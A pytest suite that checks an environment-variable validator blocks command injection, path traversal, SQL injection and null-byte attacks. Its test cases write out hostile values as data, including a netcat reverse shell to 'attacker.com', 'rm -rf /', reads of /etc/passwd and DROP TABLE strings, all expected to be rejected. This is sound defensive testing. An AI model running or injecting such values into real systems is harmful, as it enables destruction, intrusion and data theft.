"""
Security tests for context-aware environment variable validation.

Tests comprehensive protection against:
- Command injection (P0 - CRITICAL)
- SQL injection
- Path traversal
- Code injection
- Various bypass techniques

Key test coverage:
1. Command injection prevention regardless of variable name
2. Context-specific validation rules
3. Bypass attempt detection
4. Edge cases and attack vectors
5. Integration with ConfigLoader
"""


import pytest
import yaml

from src.workflow.config_loader import ConfigLoader
from src.workflow.env_var_validator import EnvVarValidator, ValidationLevel
from src.shared.utils.exceptions import ConfigValidationError


class TestCommandInjectionPrevention:
    """
    Test command injection is blocked regardless of variable name.

    This is the CRITICAL security fix - the old implementation only checked
    for shell metacharacters if the variable name matched specific patterns
    like 'cmd', 'command', 'exec', etc. This was easily bypassed.
    """

    @pytest.mark.parametrize("var_name,malicious_value,should_block", [
        # CRITICAL: Command injection via non-command variable names (NEW PROTECTION)
        ("API_ENDPOINT", "http://api.com; rm -rf /", True),
        ("DB_HOST", "localhost; cat /etc/passwd", True),
        ("MODEL_NAME", "llama3.2`whoami`", True),
        ("CONFIG_PATH", "/tmp/$(id)", True),
        ("API_URL", "https://evil.com|whoami", True),
        ("ENDPOINT", "api.com && curl attacker.com", True),
        ("SERVER_HOST", "localhost||nc -e /bin/sh attacker.com 4444", True),

        # Command variables (existing coverage - still protected)
        ("SHELL_CMD", "ls; rm -rf /", True),
        ("EXEC_PATH", "/bin/sh|whoami", True),
        ("COMMAND", "safe && malicious", True),
        ("RUN_SCRIPT", "script.sh > /dev/null; evil", True),

        # Legitimate uses that should NOT be blocked
        ("API_URL", "https://api.example.com:443/v1?key=value", False),
        ("DB_DSN", "postgresql://user:pass@localhost:5432/db", False),
        ("MODEL", "llama3.2:3b", False),
        ("PATH", "/usr/local/bin:/usr/bin:/bin", False),
        ("CONFIG_ROOT", "/etc/myapp/configs", False),
        ("ENDPOINT", "https://api.openai.com/v1/chat/completions", False),
    ])
    def test_command_injection_blocked_regardless_of_name(
        self,
        var_name: str,
        malicious_value: str,
        should_block: bool
    ):
        """
        Test that command injection is blocked based on content, not variable name.

        This is the key security improvement over the old implementation.
        """
        validator = EnvVarValidator()
        is_valid, error = validator.validate(var_name, malicious_value)

        if should_block:
            assert not is_valid, (
                f"SECURITY FAILURE: Should block command injection in {var_name}={malicious_value}"
            )
            assert error is not None
            # Verify error message indicates the security issue
            assert any(keyword in error.lower() for keyword in [
                'failed validation', 'dangerous', 'invalid', 'metacharacter'
            ])
        else:
            assert is_valid, (
                f"FALSE POSITIVE: Should allow legitimate value: {var_name}={malicious_value}\n"
                f"Error: {error}"
            )

    def test_all_shell_metacharacters_blocked_in_non_command_vars(self):
        """
        Test that shell metacharacters are blocked in appropriate contexts.

        Old behavior: Only checked command-like variable names
        New behavior: Checks based on context (some contexts allow certain chars)

        Note: STRUCTURED context (URLs) allows semicolons for query params,
        but other metacharacters are still blocked.
        """
        validator = EnvVarValidator()

        # Use variable names that will detect as IDENTIFIER or DATA context
        # (not STRUCTURED which allows semicolons in URLs)
        test_cases = [
            ("|", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
            ("&", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
            ("$", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
            ("`", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
            (">", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
            ("<", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
            ("(", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
            (")", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
            # Semicolon is tricky - allowed in STRUCTURED context
            # Test with non-URL variables
            (";", ["MODEL_NAME", "AGENT_ID", "CONFIG_VALUE"]),
        ]

        for char, var_names in test_cases:
            malicious_value = f"safe_value{char}malicious"

            for var_name in var_names:
                is_valid, error = validator.validate(var_name, malicious_value)

                # Should be blocked based on context
                assert not is_valid, (
                    f"SECURITY FAILURE: Shell metacharacter '{char}' should be blocked in "
                    f"{var_name}={malicious_value}"
                )


class TestExecutableContextStrictValidation:
    """Test EXECUTABLE context has the strictest validation."""

    def test_executable_context_blocks_all_dangerous_patterns(self):
        """Test all dangerous patterns are blocked in executable contexts."""
        validator = EnvVarValidator()

        dangerous_test_cases = [
            ("CMD", "ls; rm -rf /", "semicolon separator"),
            ("EXEC_PATH", "/bin/sh|whoami", "pipe operator"),
            ("SCRIPT", "test && evil", "AND operator"),
            ("COMMAND", "safe || evil", "OR operator"),
            ("RUN_PATH", "path > output", "output redirection"),
            ("SHELL_BIN", "sh < input", "input redirection"),
            ("BINARY", "prog $(id)", "command substitution"),
            ("PROGRAM", "app `whoami`", "backtick execution"),
            ("EXECUTABLE", "cmd ${VAR}", "variable expansion"),
        ]

        for var_name, value, attack_type in dangerous_test_cases:
            is_valid, error = validator.validate(var_name, value)
            assert not is_valid, (
                f"EXECUTABLE context should block {attack_type}: {var_name}={value}"
            )
            assert error is not None
            assert "dangerous pattern" in error.lower() or "failed validation" in error.lower()

    def test_executable_context_allows_safe_paths(self):
        """Test legitimate executable paths are allowed."""
        validator = EnvVarValidator()

        safe_executables = [
            ("CMD", "/usr/bin/python3"),
            ("EXEC_PATH", "/bin/bash"),
            ("SCRIPT", "./scripts/deploy.sh"),
            ("COMMAND", "python"),
            ("PROGRAM", "/usr/local/bin/node"),
            ("BINARY", "git"),
        ]

        for var_name, value in safe_executables:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, f"Should allow safe executable: {var_name}={value} (error: {error})"


class TestContextDetectionAccuracy:
    """Test that context is correctly detected from variable names."""

    @pytest.mark.parametrize("var_name,expected_level", [
        # Executable context
        ("SHELL_CMD", ValidationLevel.EXECUTABLE),
        ("EXEC_PATH", ValidationLevel.EXECUTABLE),
        ("RUN_SCRIPT", ValidationLevel.EXECUTABLE),
        ("COMMAND", ValidationLevel.EXECUTABLE),
        ("PROGRAM_BINARY", ValidationLevel.EXECUTABLE),

        # Path context
        ("CONFIG_PATH", ValidationLevel.PATH),
        ("DATA_DIR", ValidationLevel.PATH),
        ("HOME_DIRECTORY", ValidationLevel.PATH),
        ("FILE_PATH", ValidationLevel.PATH),
        ("ROOT_FOLDER", ValidationLevel.PATH),

        # Structured context (URLs, DSNs)
        ("API_URL", ValidationLevel.STRUCTURED),
        ("DB_DSN", ValidationLevel.STRUCTURED),
        ("ENDPOINT", ValidationLevel.STRUCTURED),
        ("SERVER_ADDRESS", ValidationLevel.STRUCTURED),
        ("CONNECTION_STRING", ValidationLevel.STRUCTURED),

        # Identifier context
        ("DB_NAME", ValidationLevel.IDENTIFIER),
        ("TABLE_NAME", ValidationLevel.IDENTIFIER),
        ("MODEL_ID", ValidationLevel.IDENTIFIER),
        ("SCHEMA", ValidationLevel.IDENTIFIER),
        ("PROVIDER", ValidationLevel.IDENTIFIER),

        # Data context (credentials)
        ("API_KEY", ValidationLevel.DATA),
        ("AUTH_TOKEN", ValidationLevel.DATA),
        ("PASSWORD", ValidationLevel.DATA),
        ("SECRET", ValidationLevel.DATA),
        ("CREDENTIAL", ValidationLevel.DATA),

        # Unrestricted context (natural language)
        ("USER_PROMPT", ValidationLevel.UNRESTRICTED),
        ("DESCRIPTION", ValidationLevel.UNRESTRICTED),
        ("MESSAGE", ValidationLevel.UNRESTRICTED),
        ("TEMPLATE_CONTENT", ValidationLevel.UNRESTRICTED),
    ])
    def test_context_detection(self, var_name: str, expected_level: ValidationLevel):
        """Test context is correctly detected from variable name."""
        validator = EnvVarValidator()
        detected_level = validator.detect_context(var_name)
        assert detected_level == expected_level, (
            f"{var_name} detected as {detected_level}, expected {expected_level}"
        )


class TestPathTraversalPrevention:
    """Test path traversal is blocked in PATH context."""

    @pytest.mark.parametrize("var_name,value,should_block", [
        # Path traversal attempts (should block)
        ("CONFIG_PATH", "../../../etc/passwd", True),
        ("DATA_DIR", "..\\..\\windows\\system32", True),
        ("FILE_PATH", "/etc/../../../passwd", True),
        ("TEMPLATE_PATH", "templates/../../etc/shadow", True),

        # Legitimate relative paths (should allow)
        ("CONFIG_PATH", "./configs/agents", False),
        ("DATA_DIR", "data/output", False),

        # Legitimate absolute paths (should allow)
        ("FILE_PATH", "/etc/myapp/config.yaml", False),
        ("ROOT_PATH", "/usr/local/share/myapp", False),
    ])
    def test_path_traversal_detection(
        self,
        var_name: str,
        value: str,
        should_block: bool
    ):
        """Test path traversal patterns are correctly detected and blocked."""
        validator = EnvVarValidator()
        is_valid, error = validator.validate(var_name, value)

        if should_block:
            assert not is_valid, f"Should block path traversal: {var_name}={value}"
            assert "traversal" in error.lower()
        else:
            assert is_valid, f"Should allow safe path: {var_name}={value} (error: {error})"


class TestSQLInjectionPrevention:
    """Test SQL injection patterns are blocked in database identifier contexts."""

    @pytest.mark.parametrize("var_name,malicious_value,attack_type", [
        ("DB_TABLE", "users'; DROP TABLE users;--", "SQL comment injection"),
        ("DB_NAME", "test' OR '1'='1", "boolean injection"),
        ("TABLE_NAME", "data' UNION SELECT * FROM passwords--", "UNION injection"),
        ("SCHEMA", "public; DELETE FROM accounts", "statement termination"),
        ("DB_QUERY", "SELECT * FROM users WHERE id='1' OR '1'='1'", "boolean injection"),
    ])
    def test_sql_injection_blocked(
        self,
        var_name: str,
        malicious_value: str,
        attack_type: str
    ):
        """Test SQL injection patterns are blocked in database contexts."""
        validator = EnvVarValidator()
        is_valid, error = validator.validate(var_name, malicious_value)

        assert not is_valid, (
            f"Should block {attack_type}: {var_name}={malicious_value}"
        )
        assert "sql injection" in error.lower()

    def test_legitimate_database_identifiers_allowed(self):
        """Test legitimate database identifiers are allowed."""
        validator = EnvVarValidator()

        legitimate = [
            ("DB_NAME", "my_database"),
            ("TABLE_NAME", "users_table"),
            ("SCHEMA", "public"),
            ("DB_HOST", "localhost"),
        ]

        for var_name, value in legitimate:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, f"Should allow legitimate identifier: {var_name}={value} (error: {error})"


class TestURLValidation:
    """Test URL validation in STRUCTURED context."""

    @pytest.mark.parametrize("var_name,value,should_pass", [
        # Valid URLs
        ("API_URL", "https://api.example.com", True),
        ("ENDPOINT", "https://api.com:443/v1?key=value&foo=bar", True),
        ("DB_DSN", "postgresql://user:pass@localhost:5432/db", True),
        ("REDIS_URL", "redis://localhost:6379/0", True),

        # Command injection attempts in URLs (should block)
        ("API_URL", "https://api.com`whoami`", False),
        ("ENDPOINT", "http://evil.com|ls", False),
        ("DB_DSN", "postgresql://localhost; rm -rf /", False),
    ])
    def test_url_validation(self, var_name: str, value: str, should_pass: bool):
        """Test URL validation in STRUCTURED context."""
        validator = EnvVarValidator()
        is_valid, error = validator.validate(var_name, value)

        if should_pass:
            assert is_valid, f"Should allow valid URL: {var_name}={value} (error: {error})"
        else:
            assert not is_valid, f"Should block malicious URL: {var_name}={value}"


class TestUnrestrictedContextPermissions:
    """Test UNRESTRICTED context allows natural language prompts."""

    def test_unrestricted_allows_prompts_with_punctuation(self):
        """Test prompts with natural language are allowed."""
        validator = EnvVarValidator()

        prompts = [
            ("USER_PROMPT", "Analyze this data! What patterns do you see?"),
            ("DESCRIPTION", "This is a description with: colons, semicolons; and more!"),
            ("MESSAGE", "Multi-line\ntext with\ttabs and special chars: @#$%^&*()"),
            ("TEMPLATE_CONTENT", "Template with {{variables}} and (parentheses) and [brackets]"),
        ]

        for var_name, value in prompts:
            is_valid, error = validator.validate(var_name, value)
            assert is_valid, (
                f"UNRESTRICTED context should allow prompt text: {var_name}={value}\n"
                f"Error: {error}"
            )

    def test_unrestricted_blocks_null_bytes(self):
        """Test null bytes are blocked even in UNRESTRICTED context."""
        validator = EnvVarValidator()

        is_valid, error = validator.validate("USER_PROMPT", "Safe text\x00malicious")
        assert not is_valid, "Null byte injection should be blocked in user prompts"
        assert error is not None, "Error message must be provided for security violations"
        assert "null byte" in error.lower(), f"Error message should mention null byte, got: {error}"


class TestSecurityEdgeCases:
    """Test edge cases and advanced attack vectors."""

    def test_null_byte_injection_always_blocked(self):
        """Test null bytes are blocked in all contexts."""
        validator = EnvVarValidator()

        test_cases = [
            ("CMD", "/bin/sh\x00../../etc/passwd"),
            ("PATH", "/etc/config\x00../../shadow"),
            ("API_URL", "https://api.com\x00malicious"),
            ("PROMPT", "Safe\x00malicious"),
        ]

        for var_name, value in test_cases:
            is_valid, error = validator.validate(var_name, value)
            assert not is_valid, f"Null bytes must always be blocked: {var_name}={value}"
            assert "null byte" in error.lower()

    def test_maximum_length_enforcement(self):
        """Test length limits prevent DoS attacks."""
        validator = EnvVarValidator()

        # Just over 10KB limit
        long_value = "A" * (10 * 1024 + 1)
        is_valid, error = validator.validate("SOME_VAR", long_value)

        assert not is_valid, f"Value exceeding 10KB limit should be blocked (length={len(long_value)})"
        assert error is not None, "Error message must be provided for length violations"
        assert "too long" in error.lower(), f"Error should mention length limit, got: {error}"
        # Validate error doesn't leak the long value
        assert long_value not in error, "Error message should not leak potentially sensitive long values"

    def test_empty_values_allowed(self):
        """Test empty values are allowed (not a security issue)."""
        validator = EnvVarValidator()

        is_valid, error = validator.validate("API_KEY", "")
        # Empty values should fail pattern validation for most contexts
        # This is correct behavior - empty credentials are invalid
        assert not is_valid, "Empty API_KEY should be rejected (empty credentials are invalid)"
        assert error is not None, "Error message must explain why empty value is invalid"
        assert "invalid" in error.lower() or "failed validation" in error.lower(), \
            f"Error should indicate validation failure, got: {error}"
        # Verify error mentions the variable name for better debugging
        assert "API_KEY" in error, f"Error should mention variable name for context, got: {error}"

    @pytest.mark.parametrize("var_name,bypass_attempt", [
        # Command substitution variants
        ("API_URL", "safe$(evil)"),
        ("ENDPOINT", "safe`evil`"),
        ("PATH", "safe${evil}"),

        # Encoded attempts (these should fail pattern validation)
        ("CMD", "/bin/sh%0Als"),  # URL encoded newline

        # Unicode tricks (should fail pattern validation for strict contexts)
        ("EXEC_PATH", "/bin/sh\u202e\u202d"),  # Right-to-left override
    ])
    def test_bypass_attempts_blocked(self, var_name: str, bypass_attempt: str):
        """Test various bypass techniques are blocked."""
        validator = EnvVarValidator()

        is_valid, error = validator.validate(var_name, bypass_attempt)
        # Should be blocked by pattern validation or specific checks
        assert not is_valid, f"Bypass attempt should be blocked: {var_name}={bypass_attempt}"


class TestConfigLoaderIntegration:
    """Test integration with ConfigLoader."""

    def test_config_loader_uses_context_aware_validation(self, tmp_path, monkeypatch):
        """Test ConfigLoader integrates with context-aware validator."""
        config_root = tmp_path / "configs"
        config_root.mkdir()
        (config_root / "agents").mkdir()

        # Create loader
        loader = ConfigLoader(config_root=config_root)

        # Set malicious env var with non-obvious name (would bypass old validation)
        monkeypatch.setenv("API_ENDPOINT", "https://api.com; rm -rf /")

        # Create config that references the malicious env var
        config = {
            "name": "test_agent",
            "version": "1.0",
            "llm": {
                "provider": "openai",
                "model": "gpt-4",
            },
            "endpoint": "${API_ENDPOINT}"
        }

        config_file = config_root / "agents" / "malicious.yaml"
        config_file.write_text(yaml.dump(config))

        # Should be blocked by context-aware validation
        with pytest.raises(ConfigValidationError) as exc_info:
            loader.load_agent("malicious", validate=False)

        error_msg = str(exc_info.value).lower()
        assert "api_endpoint" in error_msg
        # Verify it's blocked for the right reason (validation failure)
        assert any(keyword in error_msg for keyword in [
            "failed validation", "invalid", "dangerous"
        ])

    def test_legitimate_config_still_works(self, tmp_path, monkeypatch):
        """Test legitimate configs are not broken by new validation."""
        config_root = tmp_path / "configs"
        config_root.mkdir()
        (config_root / "agents").mkdir()

        loader = ConfigLoader(config_root=config_root)

        # Set legitimate env vars
        monkeypatch.setenv("API_URL", "https://api.openai.com/v1/chat/completions")
        monkeypatch.setenv("API_KEY", "sk-1234567890abcdef")
        monkeypatch.setenv("MODEL", "gpt-4")

        config = {
            "name": "safe_agent",
            "version": "1.0",
            "llm": {
                "provider": "openai",
                "model": "${MODEL}",
                "api_key": "${API_KEY}",
                "endpoint": "${API_URL}",
            }
        }

        config_file = config_root / "agents" / "safe.yaml"
        config_file.write_text(yaml.dump(config))

        # Should load successfully
        loaded_config = loader.load_agent("safe", validate=False)
        assert loaded_config is not None
        assert loaded_config["llm"]["model"] == "gpt-4"


class TestRegressionDefense:
    """Test that the fix doesn't break existing functionality."""

    def test_existing_command_variable_validation_still_works(self):
        """Test that variables with command-like names are still validated."""
        validator = EnvVarValidator()

        # These should still be caught (existing behavior preserved)
        command_vars = [
            ("SHELL_CMD", "ls; rm -rf /"),
            ("EXEC_PATH", "/bin/sh|whoami"),
            ("RUN_SCRIPT", "script && evil"),
        ]

        for var_name, value in command_vars:
            is_valid, error = validator.validate(var_name, value)
            assert not is_valid, f"Should still block: {var_name}={value}"

    def test_path_traversal_validation_preserved(self):
        """Test existing path traversal validation is preserved."""
        validator = EnvVarValidator()

        is_valid, error = validator.validate("CONFIG_PATH", "../../../etc/passwd")
        assert not is_valid, "Path traversal attack (../) should be blocked"
        assert error is not None, "Error message must be provided for path violations"
        assert "escapes" in error.lower() or "traversal" in error.lower(), \
            f"Error should mention path escape/traversal, got: {error}"
        assert "base directory" in error.lower(), \
            f"Error should mention base directory containment, got: {error}"
        # Validate security context is clear
        assert "CONFIG_PATH" in error, "Error should mention variable name for context"

    def test_sql_injection_validation_preserved(self):
        """Test existing SQL injection validation is preserved."""
        validator = EnvVarValidator()

        is_valid, error = validator.validate("DB_TABLE", "users'; DROP TABLE users;--")
        assert not is_valid, "SQL injection attack should be blocked"
        assert error is not None, "Error message must be provided for SQL injection violations"
        assert "sql injection" in error.lower(), f"Error should mention SQL injection, got: {error}"
        # Validate error doesn't leak the malicious SQL
        assert "DROP TABLE" not in error, "Error should not echo malicious SQL payload"
